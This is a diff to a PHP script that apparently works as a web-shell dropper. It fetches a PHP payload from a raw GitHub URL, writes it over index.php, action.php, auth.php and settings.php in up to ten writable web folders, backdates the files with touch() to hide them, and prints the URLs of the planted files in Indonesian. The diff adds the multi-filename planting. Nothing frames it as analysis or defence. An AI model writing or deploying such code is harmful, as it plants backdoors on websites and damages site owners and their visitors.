@@ -4,7 +4,7 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
-$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/oke.php';
+$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/im';
 
 function fetch_from_url($url) {
     if (function_exists('curl_init')) {
@@ -68,6 +68,8 @@ $targetFolders = array_slice($allWritable, 0, 10);
 $successCount = 0;
 $uploadedURLs = [];
 
+$filenames = ['index.php', 'action.php', 'auth.php', 'settings.php'];
+
 foreach ($targetFolders as $folder) {
     $randomDateTime = generate_random_datetime();
     $timestamp = strtotime($randomDateTime);
@@ -78,23 +80,25 @@ foreach ($targetFolders as $folder) {
         $originalContent
     );
 
-    $target = $folder . DIRECTORY_SEPARATOR . 'index.php';
-    if (@file_put_contents($target, $modifiedContent)) {
-        @touch($target, $timestamp, $timestamp);
+    foreach ($filenames as $filename) {
+        $target = $folder . DIRECTORY_SEPARATOR . $filename;
+        if (@file_put_contents($target, $modifiedContent)) {
+            @touch($target, $timestamp, $timestamp);
 
-        $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
-        $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
-        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-        $host = $_SERVER['HTTP_HOST'];
-        $url = rtrim($protocol . '://' . $host . $relativePath, '/') . '/index.php';
+            $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
+            $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
+            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+            $host = $_SERVER['HTTP_HOST'];
+            $url = rtrim($protocol . '://' . $host . $relativePath, '/') . '/' . $filename;
 
-        $successCount++;
-        $uploadedURLs[] = $url;
+            $successCount++;
+            $uploadedURLs[] = $url;
+        }
     }
 }
 
 if ($successCount > 0) {
-    echo "✅ Berhasil menyimpan ke $successCount folder:<br>\n";
+    echo "✅ Berhasil menyimpan ke $successCount file:<br>\n";
     foreach ($uploadedURLs as $url) {
         echo $url . "<br>\n";
     }
